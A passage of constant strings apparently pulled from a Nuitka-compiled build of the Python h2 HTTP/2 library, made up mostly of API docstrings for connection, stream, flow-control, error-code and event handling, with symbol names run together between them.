        called on a server connection, the user **must** provide the value they
        received from the client in the ``HTTP2-Settings`` header field to the
        ``settings_header`` argument, which will be used appropriately.

        Additionally, this method sets up stream 1 in a half-closed state
        appropriate for this side of the connection, to reflect the fact that
        the request is already complete.

        Finally, this method also prepares the appropriate preamble to be sent
        after the upgrade.

        .. versionadded:: 2.3.0

        :param settings_header: (optional, server-only): The value of the
             ``HTTP2-Settings`` header field received from the client.
        :type settings_header: ``bytes``

        :returns: For clients, a bytestring to put in the ``HTTP2-Settings``.
            For servers, returns nothing.
        :rtype: ``bytes`` or ``None``
        u
        Gets a stream by its stream ID. Will create one if one does not already
        exist. Use allowed_ids to circumvent the usual stream ID rules for
        clients and servers.

        .. versionchanged:: 2.0.0
           Removed this function from the public API.
        aNoSuchStreamErroraStreamClosedErroru
        Gets a stream by its stream ID. Raises NoSuchStreamError if the stream
        ID does not correspond to a known stream and is higher than the current
        maximum: raises if it is lower than the current maximum.

        .. versionchanged:: 2.0.0
           Removed this function from the public API.
        uNext available stream ID %daHIGHEST_ALLOWED_STREAM_IDaNoAvailableStreamIDErrorTuExhausted allowed stream IDsu
        Returns an integer suitable for use as the stream ID for the next
        stream created by this endpoint. For server endpoints, this stream ID
        will be even. For client endpoints, this stream ID will be odd. If no
        stream IDs are available, raises :class:`NoAvailableStreamIDError
        <h2.exceptions.NoAvailableStreamIDError>`.

        .. warning:: The return value from this function does not change until
                     the stream ID has actually been used by sending or pushing
                     headers on that stream. For that reason, it should be
                     called as close as possible to the actual use of the
                     stream ID.

        .. versionadded:: 2.0.0

        :raises: :class:`NoAvailableStreamIDError
            <h2.exceptions.NoAvailableStreamIDError>`
        :returns: The next free stream ID this peer can use to initiate a
            stream.
        :rtype: ``int``
        uSend headers on stream ID %damax_concurrent_streamsaopen_outbound_streamsaTooManyStreamsErroruMax outbound streams is %d, %d opena_get_or_create_streamasend_headersaRFC1122ErrorTuServers SHOULD NOT prioritize streams.aflagsaaddTaPRIORITYa_add_frame_prioritya_prepare_for_sendingu
        Send headers on a given stream.

        This function can be used to send request or response headers: the kind
        that are sent depends on whether this connection has been opened as a
        client or server connection, and whether the stream was opened by the
        remote peer or not.

        If this is a client connection, calling ``send_headers`` will send the
        headers as a request. It will also implicitly open the stream being
        used. If this is a client connection and ``send_headers`` has *already*
        been called, this will send trailers instead.

        If this is a server connection, calling ``send_headers`` will send the
        headers as a response. It is a protocol error for a server to open a
        stream by sending headers. If this is a server connection and
        ``send_headers`` has *already* been called, this will send trailers
        instead.

        When acting as a server, you may call ``send_headers`` any number of
        times allowed by the following rules, in this order:

        - zero or more times with ``(':status', '1XX')`` (where ``1XX`` is a
          placeholder for any 100-level status code).
        - once with any other status header.
        - zero or one time for trailers.

        That is, you are allowed to send as many informational responses as you
        like, followed by one complete response and zero or one HTTP trailer
        blocks.

        Clients may send one or two header blocks: one request block, and
        optionally one trailer block.

        If it is important to send HPACK "never indexed" header fields (as
        defined in `RFC 7451 Section 7.1.3
        <https://tools.ietf.org/html/rfc7541#section-7.1.3>`_), the user may
        instead provide headers using the HPACK library's :class:`HeaderTuple
        <hpack:hpack.HeaderTuple>` and :class:`NeverIndexedHeaderTuple
        <hpack:hpack.NeverIndexedHeaderTuple>` objects.

        This method also allows users to prioritize the stream immediately,
        by sending priority information on the HEADERS frame directly. To do
        this, any one of ``priority_weight``, ``priority_depends_on``, or
        ``priority_exclusive`` must be set to a value that is not ``None``. For
        more information on the priority fields, see :meth:`prioritize
        <h2.connection.H2Connection.prioritize>`.

        .. warning:: In HTTP/2, it is mandatory that all the HTTP/2 special
            headers (that is, ones whose header keys begin with ``:``) appear
            at the start of the header block, before any normal headers.

        .. versionchanged:: 2.3.0
           Added support for using :class:`HeaderTuple
           <hpack:hpack.HeaderTuple>` objects to store headers.

        .. versionchanged:: 2.4.0
           Added the ability to provide priority keyword arguments:
           ``priority_weight``, ``priority_depends_on``, and
           ``priority_exclusive``.

        :param stream_id: The stream ID to send the headers on. If this stream
            does not currently exist, it will be created.
        :type stream_id: ``int``

        :param headers: The request/response headers to send.
        :type headers: An iterable of two tuples of bytestrings or
            :class:`HeaderTuple <hpack:hpack.HeaderTuple>` objects.

        :param end_stream: Whether this headers frame should end the stream
            immediately (that is, whether no more data will be sent after this
            frame). Defaults to ``False``.
        :type end_stream: ``bool``

        :param priority_weight: Sets the priority weight of the stream. See
            :meth:`prioritize <h2.connection.H2Connection.prioritize>` for more
            about how this field works. Defaults to ``None``, which means that
            no priority information will be sent.
        :type priority_weight: ``int`` or ``None``

        :param priority_depends_on: Sets which stream this one depends on for
            priority purposes. See :meth:`prioritize
            <h2.connection.H2Connection.prioritize>` for more about how this
            field works. Defaults to ``None``, which means that no priority
            information will be sent.
        :type priority_depends_on: ``int`` or ``None``

        :param priority_exclusive: Sets whether this stream exclusively depends
            on the stream given in ``priority_depends_on`` for priority
            purposes. See :meth:`prioritize
            <h2.connection.H2Connection.prioritize>` for more about how this
            field workds. Defaults to ``None``, which means that no priority
            information will be sent.
        :type priority_depends_on: ``bool`` or ``None``

        :returns: Nothing
        uSend data on stream ID %d with len %dupad_length must be an intlupad_length must be within range: [0, 255]uFrame size on stream ID %d is %dalocal_flow_control_windowaFlowControlErroruCannot send %d bytes, flow control window is %d.aFrameTooLargeErroruCannot send frame size %d, max frame size is %daSEND_DATAasend_dataTapad_lengthuOutbound flow control window size is %du
        Send data on a given stream.

        This method does no breaking up of data: if the data is larger than the
        value returned by :meth:`local_flow_control_window
        <h2.connection.H2Connection.local_flow_control_window>` for this stream
        then a :class:`FlowControlError <h2.exceptions.FlowControlError>` will
        be raised. If the data is larger than :data:`max_outbound_frame_size
        <h2.connection.H2Connection.max_outbound_frame_size>` then a
        :class:`FrameTooLargeError <h2.exceptions.FrameTooLargeError>` will be
        raised.

        h2 does this to avoid buffering the data internally. If the user
        has more data to send than h2 will allow, consider breaking it up
        and buffering it externally.

        :param stream_id: The ID of the stream on which to send the data.
        :type stream_id: ``int``
        :param data: The data to send on the stream.
        :type data: ``bytes``
        :param end_stream: (optional) Whether this is the last data to be sent
            on the stream. Defaults to ``False``.
        :type end_stream: ``bool``
        :param pad_length: (optional) Length of the padding to apply to the
            data frame. Defaults to ``None`` for no use of padding. Note that
            a value of ``0`` results in padding of length ``0``
            (with the "padding" flag set on the frame).

            .. versionadded:: 2.6.0

        :type pad_length: ``int``
        :returns: Nothing
        uEnd stream ID %daend_streamu
        Cleanly end a given stream.

        This method ends a stream by sending an empty DATA frame on that stream
        with the ``END_STREAM`` flag set.

        :param stream_id: The ID of the stream to end.
        :type stream_id: ``int``
        :returns: Nothing
        aMAX_WINDOW_INCREMENTuFlow control increment must be between 1 and %daSEND_WINDOW_UPDATEaincrease_flow_control_windowuIncrease stream ID %d flow control window by %dawindow_openedawindow_incrementuIncrease connection flow control window by %du
        Increment a flow control window, optionally for a single stream. Allows
        the remote peer to send more data.

        .. versionchanged:: 2.0.0
           Rejects attempts to increment the flow control window by out of
           range values with a ``ValueError``.

        :param increment: The amount to increment the flow control window by.
        :type increment: ``int``
        :param stream_id: (optional) The ID of the stream that should have its
            flow control window opened. If not present or ``None``, the
            connection flow control window will be opened instead.
        :type stream_id: ``int`` or ``None``
        :returns: Nothing
        :raises: ``ValueError``
        uSend Push Promise frame on stream ID %daenable_pushTuRemote peer has disabled stream pushaSEND_PUSH_PROMISEa_get_stream_by_idTuCannot recursively push streams.aEVENapush_stream_in_bandalocally_pushedu
        Push a response to the client by sending a PUSH_PROMISE frame.

        If it is important to send HPACK "never indexed" header fields (as
        defined in `RFC 7451 Section 7.1.3
        <https://tools.ietf.org/html/rfc7541#section-7.1.3>`_), the user may
        instead provide headers using the HPACK library's :class:`HeaderTuple
        <hpack:hpack.HeaderTuple>` and :class:`NeverIndexedHeaderTuple
        <hpack:hpack.NeverIndexedHeaderTuple>` objects.

        :param stream_id: The ID of the stream that this push is a response to.
        :type stream_id: ``int``
        :param promised_stream_id: The ID of the stream that the pushed
            response will be sent on.
        :type promised_stream_id: ``int``
        :param request_headers: The headers of the request that the pushed
            response will be responding to.
        :type request_headers: An iterable of two tuples of bytestrings or
            :class:`HeaderTuple <hpack:hpack.HeaderTuple>` objects.
        :returns: Nothing
        TuSend Ping frameuInvalid value for ping data: %raSEND_PINGaopaque_datau
        Send a PING frame.

        :param opaque_data: A bytestring of length 8 that will be sent in the
                            PING frame.
        :returns: Nothing
        uReset stream ID %daSEND_RST_STREAMareset_streamu
        Reset a stream.

        This method forcibly closes a stream by sending a RST_STREAM frame for
        a given stream. This is not a graceful closure. To gracefully end a
        stream, try the :meth:`end_stream
        <h2.connection.H2Connection.end_stream>` method.

        :param stream_id: The ID of the stream to reset.
        :type stream_id: ``int``
        :param error_code: (optional) The error code to use to reset the
            stream. Defaults to :data:`ErrorCodes.NO_ERROR
            <h2.errors.ErrorCodes.NO_ERROR>`.
        :type error_code: ``int``
        :returns: Nothing
        TuClose connectionaSEND_GOAWAYTastream_idalast_stream_idaerror_codeaadditional_datau
        Close a connection, emitting a GOAWAY frame.

        .. versionchanged:: 2.4.0
           Added ``additional_data`` and ``last_stream_id`` arguments.

        :param error_code: (optional) The error code to send in the GOAWAY
            frame.
        :param additional_data: (optional) Additional debug data indicating
            a reason for closing the connection. Must be a bytestring.
        :param last_stream_id: (optional) The last stream which was processed
            by the sender. Defaults to ``highest_inbound_stream_id``.
        :returns: Nothing
        uUpdate connection settings to %saupdateu
        Update the local settings. This will prepare and emit the appropriate
        SETTINGS frame.

        :param new_settings: A dictionary of {setting: new value}
        uField must be bytestring.uMust not provide both origin and stream_idaSEND_ALTERNATIVE_SERVICETastream_idaoriginafieldaadvertise_alternative_serviceu
        Notify a client about an available Alternative Service.

        An Alternative Service is defined in `RFC 7838
        <https://tools.ietf.org/html/rfc7838>`_. An Alternative Service
        notification informs a client that a given origin is also available
        elsewhere.

        Alternative Services can be advertised in two ways. Firstly, they can
        be advertised explicitly: that is, a server can say "origin X is also
        available at Y". To advertise like this, set the ``origin`` argument
        and not the ``stream_id`` argument. Alternatively, they can be
        advertised implicitly: that is, a server can say "the origin you're
        contacting on stream X is also available at Y". To advertise like this,
        set the ``stream_id`` argument and not the ``origin`` argument.

        The explicit method of advertising can be done as long as the
        connection is active. The implicit method can only be done after the
        client has sent the request headers and before the server has sent the
        response headers: outside of those points, h2 will forbid sending
        the Alternative Service advertisement by raising a ProtocolError.

        The ``field_value`` parameter is specified in RFC 7838. h2 does
        not validate or introspect this argument: the user is required to
        ensure that it's well-formed. ``field_value`` corresponds to RFC 7838's
        "Alternative Service Field Value".

        .. note:: It is strongly preferred to use the explicit method of
                  advertising Alternative Services. The implicit method of
                  advertising Alternative Services has a number of subtleties
                  and can lead to inconsistencies between the server and
                  client. h2 allows both mechanisms, but caution is
                  strongly advised.

        .. versionadded:: 2.3.0

        :param field_value: The RFC 7838 Alternative Service Field Value. This
            argument is not introspected by h2: the user is responsible
            for ensuring that it is well-formed.
        :type field_value: ``bytes``

        :param origin: The origin/authority to which the Alternative Service
            being advertised applies. Must not be provided at the same time as
            ``stream_id``.
        :type origin: ``bytes`` or ``None``

        :param stream_id: The ID of the stream which was sent to the authority
            for which this Alternative Service advertisement applies. Must not
            be provided at the same time as ``origin``.
        :type stream_id: ``int`` or ``None``

        :returns: Nothing.
        aSEND_PRIORITYu
        Notify a server about the priority of a stream.

        Stream priorities are a form of guidance to a remote server: they
        inform the server about how important a given response is, so that the
        server may allocate its resources (e.g. bandwidth, CPU time, etc.)
        accordingly. This exists to allow clients to ensure that the most
        important data arrives earlier, while less important data does not
        starve out the more important data.

        Stream priorities are explained in depth in `RFC 7540 Section 5.3
        <https://tools.ietf.org/html/rfc7540#section-5.3>`_.

        This method updates the priority information of a single stream. It may
        be called well before a stream is actively in use, or well after a
        stream is closed.

        .. warning:: RFC 7540 allows for servers to change the priority of
                     streams. However, h2 **does not** allow server
                     stacks to do this. This is because most clients do not
                     adequately know how to respond when provided conflicting
                     priority information, and relatively little utility is
                     provided by making that functionality available.

        .. note:: h2 **does not** maintain any information about the
                  RFC 7540 priority tree. That means that h2 does not
                  prevent incautious users from creating invalid priority
                  trees, particularly by creating priority loops. While some
                  basic error checking is provided by h2, users are
                  strongly recommended to understand their prioritisation
                  strategies before using the priority tools here.

        .. note:: Priority information is strictly advisory. Servers are
                  allowed to disregard it entirely. Avoid relying on the idea
                  that your priority signaling will definitely be obeyed.

        .. versionadded:: 2.4.0

        :param stream_id: The ID of the stream to prioritize.
        :type stream_id: ``int``

        :param weight: The weight to give the stream. Defaults to ``16``, the
             default weight of any stream. May be any value between ``1`` and
             ``256`` inclusive. The relative weight of a stream indicates what
             proportion of available resources will be allocated to that
             stream.
        :type weight: ``int``

        :param depends_on: The ID of the stream on which this stream depends.
             This stream will only be progressed if it is impossible to
             progress the parent stream (the one on which this one depends).
             Passing the value ``0`` means that this stream does not depend on
             any other. Defaults to ``0``.
        :type depends_on: ``int``

        :param exclusive: Whether this stream is an exclusive dependency of its
            "parent" stream (i.e. the stream given by ``depends_on``). If a
            stream is an exclusive dependency of another, that means that all
            previously-set children of the parent are moved to become children
            of the new exclusively-dependent stream. Defaults to ``False``.
        :type exclusive: ``bool``
        aminu
        Returns the maximum amount of data that can be sent on stream
        ``stream_id``.

        This value will never be larger than the total data that can be sent on
        the connection: even if the given stream allows more data, the
        connection window provides a logical maximum to the amount of data that
        can be sent.

        The maximum data that can be sent in a single data frame on a stream
        is either this value, or the maximum frame size, whichever is
        *smaller*.

        :param stream_id: The ID of the stream whose flow control window is
            being queried.
        :type stream_id: ``int``
        :returns: The amount of data in bytes that can be sent on the stream
            before the flow control window is exhausted.
        :rtype: ``int``
        ainbound_flow_control_windowu
        Returns the maximum amount of data the remote peer can send on stream
        ``stream_id``.

        This value will never be larger than the total data that can be sent on
        the connection: even if the given stream allows more data, the
        connection window provides a logical maximum to the amount of data that
        can be sent.

        The maximum data that can be sent in a single data frame on a stream
        is either this value, or the maximum frame size, whichever is
        *smaller*.

        :param stream_id: The ID of the stream whose flow control window is
            being queried.
        :type stream_id: ``int``
        :returns: The amount of data in bytes that can be received on the
            stream before the flow control window is exhausted.
        :rtype: ``int``
        uAck received data on stream ID %d with size %duStream ID %d is not valid for acknowledge_received_datauCannot acknowledge negative dataaprocess_bytesastreamaacknowledge_received_datau
        Inform the :class:`H2Connection <h2.connection.H2Connection>` that a
        certain number of flow-controlled bytes have been processed, and that
        the space should be handed back to the remote peer at an opportune
        time.

        .. versionadded:: 2.5.0

        :param acknowledged_size: The total *flow-controlled size* of the data
            that has been processed. Note that this must include the amount of
            padding that was sent with that data.
        :type acknowledged_size: ``int``
        :param stream_id: The ID of the stream on which this data was received.
        :type stream_id: ``int``
        :returns: Nothing
        :rtype: ``None``
        u
        Returns some data for sending out of the internal data buffer.

        This method is analogous to ``read`` on a file-like object, but it
        doesn't block. Instead, it returns as much data as the user asks for,
        or less if that much data is not available. It does not perform any
        I/O, and so uses a different name.

        :param amount: (optional) The maximum amount of data to return. If not
            set, or set to ``None``, will return as much data as possible.
        :type amount: ``int``
        :returns: A bytestring containing the data to send on the wire.
        :rtype: ``bytes``
        u
        Clears the outbound data buffer, such that if this call was immediately
        followed by a call to
        :meth:`data_to_send <h2.connection.H2Connection.data_to_send>`, that
        call would return no data.

        This method should not normally be used, but is made available to avoid
        exposing implementation details.
        aacknowledgeaINITIAL_WINDOW_SIZEa_flow_control_change_from_settingsaoriginal_valueanew_valueaHEADER_TABLE_SIZEaheader_table_sizeaMAX_FRAME_SIZEavaluesasettingTaACKu
        Acknowledge settings that have been received.

        .. versionchanged:: 2.0.0
           Removed from public API, removed useless ``event`` parameter, made
           automatic.

        :returns: Nothing
        aguard_increment_windowadeltau
        Update flow control windows in response to a change in the value of
        SETTINGS_INITIAL_WINDOW_SIZE.

        When this setting is changed, it automatically updates all flow control
        windows by the delta in the settings values. Note that it does not
        increment the *connection* flow control window, per section 6.9.2 of
        RFC 7540.
        a_inbound_flow_control_change_from_settingsu
        Update remote flow control windows in response to a change in the value
        of SETTINGS_INITIAL_WINDOW_SIZE.

        When this setting is changed, it automatically updates all remote flow
        control windows by the delta in the settings values.
        atraceuProcess received data on connection. Received data: %raadd_dataaeventsa_receive_frameaInvalidPaddingErrora_terminate_connectionaErrorCodesaPROTOCOL_ERRORTuReceived frame with invalid padding.aerror_codeu
        Pass some received HTTP/2 data to the connection for handling.

        :param data: The data received from the remote peer on the network.
        :type data: ``bytes``
        :returns: A list of events that the remote peer triggered by sending
            this data.
        uReceived frame: %sa_stream_is_closed_by_resetastream_ida_eventsaSTREAM_CLOSEDa_stream_is_closed_by_endaframesu
        Handle a frame received on the connection.

        .. versionchanged:: 2.0.0
           Removed from the public API.
        alast_stream_idu
        Terminate the connection early. Used in error handling blocks to send
        GOAWAY frames.
        aopen_inbound_streamsa_decode_headersadataareceive_headersaEND_STREAMaheader_encodingaPRIORITYapriority_updatedaextendu
        Receive a headers frame on the connection.
        TuReceived pushed streamaRECV_PUSH_PROMISEa_stream_closed_byaStreamClosedByapromised_stream_idaREFUSED_STREAMTuAttempted to push on closed stream.areceive_push_promise_in_bandaremotely_pushedu
        Receive a push-promise frame on the connection.
        aflow_controlled_lengthuReceived DATA frame on closed stream %d - auto-emitted a WINDOW_UPDATE by %duStream %d already CLOSED or cleaned up - auto-emitted a RST_FRAMEaRECV_DATAawindow_consumedareceive_dataa_handle_data_on_closed_streamu
        Receive a data frame on the connection.
        aRECV_SETTINGSaACKa_local_settings_ackedaSettingsAcknowledgedachanged_settingsaappendaRemoteSettingsChangedafrom_settingsa_acknowledge_settingsu
        Receive a SETTINGS frame on the connection.
        aRECV_WINDOW_UPDATEareceive_window_updateaWindowUpdatedu
        Receive a WINDOW_UPDATE frame on the connection.
        aRECV_PINGaPingAckReceivedaPingReceivedSaACKaping_datau
        Receive a PING frame on the connection.
        aRECV_RST_STREAMastream_resetastream_framesastream_eventsu
        Receive a RST_STREAM frame on the connection.
        aRECV_PRIORITYaPriorityUpdatedadepends_onaexclusiveastream_weightaweightuStream %d may not depend on itselfu
        Receive a PRIORITY frame on the connection.
        aRECV_GOAWAYaclear_outbound_data_bufferaConnectionTerminateda_error_code_from_intaadditional_datau
        Receive a GOAWAY frame on the connection.
        areceive_continuationTuShould not be reachableu
        A naked CONTINUATION frame has been received. This is always an error,
        but the type of error it is depends on the state of the stream and must
        transition the state of the stream, so we need to pass it to the
        appropriate stream.
        aRECV_ALTERNATIVE_SERVICEareceive_alt_svcaAlternativeServiceAvailableafield_valueu
        An ALTSVC frame has been received. This frame, specified in RFC 7838,
        is used to advertise alternative places where the same service can be
        reached.

        This frame can optionally be received either on a stream or on stream
        0, and its semantics are different in each case.
        uReceived unknown extension frame (ID %d)aUnknownFrameReceivedaframeu
        We have received a frame that we do not understand. This is almost
        certainly an extension frame, though it's impossible to be entirely
        sure.

        RFC 7540 § 5.5 says that we MUST ignore unknown frame types: so we
        do. We do notify the user that we received one, however.
        amax_allowed_table_sizeu
        Handle the local settings being ACKed, update internal state.
        u
        Returns ``True`` if the stream ID corresponds to an outbound stream
        (one initiated by this peer), returns ``False`` otherwise.
        u
        Returns how the stream was closed.

        The return value will be either a member of
        ``h2.stream.StreamClosedBy`` or ``None``. If ``None``, the stream was
        closed implicitly by the peer opening a stream with a higher stream ID
        before opening this one.
        u
        Returns ``True`` if the stream was closed by sending or receiving a
        RST_STREAM frame. Returns ``False`` otherwise.
        aRECV_END_STREAMaSEND_END_STREAMu
        Returns ``True`` if the stream was closed by sending or receiving an
        END_STREAM flag in a HEADERS or DATA frame. Returns ``False``
        otherwise.
        luWeight must be between 1 and 256, not %dlu
    Adds priority data to a given frame. Does not change any flags set on that
    frame: if the caller is adding priority information to a HEADERS frame they
    must set that themselves.

    This method also deliberately sets defaults for anything missing.

    This method validates the input values.
    adecodeDarawtaOversizedHeaderListErroraDenialOfServiceErroruOversized header block: %saHPACKErroruError decoding header block: %su
    Decode a HPACK-encoded header block, translating HPACK exceptions into
    sensible h2 errors.

    This only ever returns bytestring headers: h2 may emit them as
    unicode later, but internally it processes them as bytestrings only.
    u
h2/connection
~~~~~~~~~~~~~

An implementation of a HTTP/2 connection.
a__doc__a__file__a__spec__ahas_locationa__cached__aenumTaEnumaIntEnumaEnumaIntEnumuhyperframe.exceptionsTaInvalidPaddingErroruhyperframe.frameTaGoAwayFrameaWindowUpdateFrameaHeadersFrameaDataFrameaPingFrameaPushPromiseFrameaSettingsFrameaRstStreamFrameaPriorityFrameaContinuationFrameaAltSvcFrameaExtensionFrameuhpack.hpackTaEncoderaDecoderuhpack.exceptionsTaHPACKErroraOversizedHeaderListErrorTaH2ConfigurationaerrorsTaErrorCodesa_error_code_from_intTaWindowUpdatedaRemoteSettingsChangedaPingReceivedaPingAckReceivedaSettingsAcknowledgedaConnectionTerminatedaPriorityUpdatedaAlternativeServiceAvailableaUnknownFrameReceivedaexceptionsT
aProtocolErroraNoSuchStreamErroraFlowControlErroraFrameTooLargeErroraTooManyStreamsErroraStreamClosedErroraStreamIDTooLowErroraNoAvailableStreamIDErroraRFC1122ErroraDenialOfServiceErroraframe_bufferTaFrameBufferTaSettingsaSettingCodesTaH2StreamaStreamClosedByautilitiesTaSizeLimitDictaguard_increment_windowawindowsTaWindowManagera__prepare__a__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>uh2.connectiona__module__a__qualname__aCLIENT_OPENaSERVER_OPENla__orig_bases__lllllll
lll
lllllu
    A single HTTP/2 connection state machine.

    This state machine, while defined in its own class, is logically part of
    the H2Connection class also defined in this file. The state machine itself
    maintains very little state directly, instead focusing entirely on managing
    state transitions.
    a__init__uH2ConnectionStateMachine.__init__uH2ConnectionStateMachine.process_inputu
    A low-level HTTP/2 connection object. This handles building and receiving
    frames and maintains both connection and per-stream state for all streams
    on this connection.

    This wraps a HTTP/2 Connection state machine implementation, ensuring that
    frames can only be sent/received when the connection is in a valid state.
    It also builds stream state machines on demand to ensure that the
    constraints of those state machines are met as well. Attempts to create
    frames that cannot be sent will raise a ``ProtocolError``.

    .. versionchanged:: 2.3.0
       Added the ``header_encoding`` keyword argument.

    .. versionchanged:: 2.5.0
       Added the ``config`` keyword argument. Deprecated the ``client_side``
       and ``header_encoding`` parameters.

    .. versionchanged:: 3.0.0
       Removed deprecated parameters and properties.

    :param config: The configuration for the HTTP/2 connection.

        .. versionadded:: 2.5.0

    :type config: :class:`H2Configuration <h2.config.H2Configuration>`
    aH2ConnectionlaDEFAULT_MAX_OUTBOUND_FRAME_SIZElaDEFAULT_MAX_INBOUND_FRAME_SIZEglTnuH2Connection.__init__uH2Connection._prepare_for_sendinguH2Connection._open_streamsuH2Connection.open_outbound_streamsuH2Connection.open_inbound_streamsuH2Connection.inbound_flow_control_windowuH2Connection._begin_new_streamuH2Connection.initiate_connectionainitiate_upgrade_connectionuH2Connection.initiate_upgrade_connectionuH2Connection._get_or_create_streamuH2Connection._get_stream_by_idaget_next_available_stream_iduH2Connection.get_next_available_stream_idTFnnnuH2Connection.send_headersTFnuH2Connection.send_datauH2Connection.end_streamaincrement_flow_control_windowuH2Connection.increment_flow_control_windowapush_streamuH2Connection.push_streamapinguH2Connection.pinguH2Connection.reset_streamTlnnaclose_connectionuH2Connection.close_connectionaupdate_settingsuH2Connection.update_settingsTnnuH2Connection.advertise_alternative_serviceTnnnaprioritizeuH2Connection.prioritizeuH2Connection.local_flow_control_windowaremote_flow_control_windowuH2Connection.remote_flow_control_windowuH2Connection.acknowledge_received_dataadata_to_senduH2Connection.data_to_senduH2Connection.clear_outbound_data_bufferuH2Connection._acknowledge_settingsuH2Connection._flow_control_change_from_settingsuH2Connection._inbound_flow_control_change_from_settingsuH2Connection.receive_datauH2Connection._receive_frameuH2Connection._terminate_connectionuH2Connection._receive_headers_frameuH2Connection._receive_push_promise_frameuH2Connection._handle_data_on_closed_streamuH2Connection._receive_data_frameuH2Connection._receive_settings_frameuH2Connection._receive_window_update_frameuH2Connection._receive_ping_frameuH2Connection._receive_rst_stream_frameuH2Connection._receive_priority_frameuH2Connection._receive_goaway_frameuH2Connection._receive_naked_continuationuH2Connection._receive_alt_svc_frameuH2Connection._receive_unknown_frameuH2Connection._local_settings_ackeduH2Connection._stream_id_is_outbounduH2Connection._stream_closed_byuH2Connection._stream_is_closed_by_resetuH2Connection._stream_is_closed_by_enduh2\connection.pyTa.0wfTa.0wfaselfu<module h2.connection>Ta__class__TaselfaconfigTaselfTaselfachangesasettingastreamwfTaframeaweightadepends_onaexclusiveTaselfastream_idaallowed_idsaoutboundahighest_stream_idwsTadecoderaencoded_header_blockweTaselfaold_valueanew_valueadeltaastreamTaselfastream_idaallowed_idsTaselfastream_idaoutboundahighest_stream_idTaselfaeventsaexcaframeaframesaconn_manageraconn_incrementwfTaselfachangesasettingTaselfaremainderacountato_deleteastream_idastreamTaselfaframesTaselfaframeaeventsaframesastreamastream_framesastream_eventsaeventTaselfaframeaflow_controlled_lengthaeventsastreamaframesastream_eventsweTaselfaframeaframesaeventswewfTaselfaframeaeventsanew_eventT
aselfaframeamax_open_streamsaheadersaeventsastreamaframesastream_eventsap_framesap_eventsTaselfaframeastreamTaselfaframeaeventsaflagsaevtwfTaselfaframeaeventsaeventTaselfaframeapushed_headersaeventsastreamwfaframesastream_eventsanew_streamTaselfaframeaeventsastreamastream_framesastream_eventsTaselfaframeaeventsachanged_settingsaack_eventaframesTaselfaframeaeventTaselfaframeaeventsastreamaframesastream_eventsawindow_updated_eventTaselfastream_idTaselfaerror_codewfTaselfaacknowledged_sizeastream_idaframesaconn_manageraconn_incrementwfastreamTaselfafield_valueaoriginastream_idwfaframesastreamTaselfaerror_codeaadditional_dataalast_stream_idwfTaselfaamountadataTaselfastream_idaframesTaselfanext_stream_idTaselfaincrementastream_idastreamaframeswfTaselfapreamblewfasettingavalueTaselfasettings_headeraframe_datawfasettingavalueaconnection_inputTaselfastream_idastreamTaselfainbound_numbersTaselfaoutbound_numbersTaselfaopaque_datawfTaselfastream_idaweightadepends_onaexclusiveaframeTaselfainput_afuncatarget_stateaold_stateTaselfastream_idapromised_stream_idarequest_headersastreamanew_streamaframesanew_framesTaselfadataaeventsaframeweTaselfastream_idaerror_codeastreamaframesTaselfastream_idadataaend_streamapad_lengthaframe_sizeaframesTaselfastream_idaheadersaend_streamapriority_weightapriority_depends_onapriority_exclusiveamax_open_streamsastreamaframesapriority_presentaheaders_frameTaselfanew_settingswsu.h2u
h2
~~

A HTTP/2 implementation.
a__doc__a__file__apathadirnameaenvironagetTaNUITKA_PACKAGE_h2u\not_existinga__path__a__spec__aoriginahas_locationasubmodule_search_locationsa__cached__u4.1.0a__version__uh2\__init__.pyu<module h2>u.h2.errors
8aErrorCodesu
    Given an integer error code, returns either one of :class:`ErrorCodes
    <h2.errors.ErrorCodes>` or, if not present in the known set of codes,
    returns the integer directly.
    u
h2/errors
~~~~~~~~~

Global error code registry containing the established HTTP/2 error codes.

The current registry is available at:
https://tools.ietf.org/html/rfc7540#section-11.4
a__doc__a__file__a__spec__aoriginahas_locationa__cached__aenumlaIntEnuma__prepare__a__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>uh2.errorsa__module__u
    All known HTTP/2 error codes.

    .. versionadded:: 2.5.0
    a__qualname__aNO_ERRORlaPROTOCOL_ERRORlaINTERNAL_ERRORlaFLOW_CONTROL_ERRORlaSETTINGS_TIMEOUTlaSTREAM_CLOSEDlaFRAME_SIZE_ERRORlaREFUSED_STREAMlaCANCELlaCOMPRESSION_ERRORl
aCONNECT_ERRORlaENHANCE_YOUR_CALMlaINADEQUATE_SECURITYl
aHTTP_1_1_REQUIREDa__orig_bases__a_error_code_from_inta__all__uh2\errors.pyu<module h2.errors>Ta__class__Tacodeu.h2.events2astream_idaheadersastream_endedapriority_updatedu<RequestReceived stream_id:%s, headers:%s>u<ResponseReceived stream_id:%s, headers:%s>u<TrailersReceived stream_id:%s, headers:%s>u<InformationalResponseReceived stream_id:%s, headers:%s>adataaflow_controlled_lengthu<DataReceived stream_id:%s, flow_controlled_length:%s, data:%s>a_bytes_representation:nlnadeltau<WindowUpdated stream_id:%s, delta:%s>achanged_settingsaitemsutoo many values to unpack (expected 2)a_setting_code_from_intaold_settingsagetaChangedSettingweu
        Build a RemoteSettingsChanged event from a set of changed settings.

        :param old_settings: A complete collection of old settings, in the form
                             of a dictionary of ``{setting: value}``.
        :param new_settings: All the changed settings and their new values, in
                             the form of a dictionary of ``{setting: value}``.
        u<RemoteSettingsChanged changed_settings:{%s}>u, avaluesu<genexpr>uRemoteSettingsChanged.__repr__.<locals>.<genexpr>aping_datau<PingReceived ping_data:%s>u<PingAckReceived ping_data:%s>u<StreamEnded stream_id:%s>aerror_codearemote_resetu<StreamReset stream_id:%s, error_code:%s, remote_reset:%s>apushed_stream_idaparent_stream_idu<PushedStreamReceived pushed_stream_id:%s, parent_stream_id:%s, headers:%s>u<SettingsAcknowledged changed_settings:{%s}>uSettingsAcknowledged.__repr__.<locals>.<genexpr>aweightadepends_onaexclusiveu<PriorityUpdated stream_id:%s, weight:%s, depends_on:%s, exclusive:%s>alast_stream_idaadditional_datau<ConnectionTerminated error_code:%s, last_stream_id:%s, additional_data:%s>aoriginafield_valueu<AlternativeServiceAvailable origin:%s, field_value:%s>adecodeTuutf-8aignoreaframeabinasciiahexlifyTaasciiu
    Converts a bytestring into something that is safe to print on all Python
    platforms.

    This function is relatively expensive, so it should not be called on the
    mainline of the code. It's safe to use in things like object repr methods
    though.
    u
h2/events
~~~~~~~~~

Defines Event types for HTTP/2.

Events are returned by the H2 state machine to allow implementations to keep
track of events triggered by receiving data. Each time data is provided to the
H2 state machine it processes the data and returns a list of Event objects.
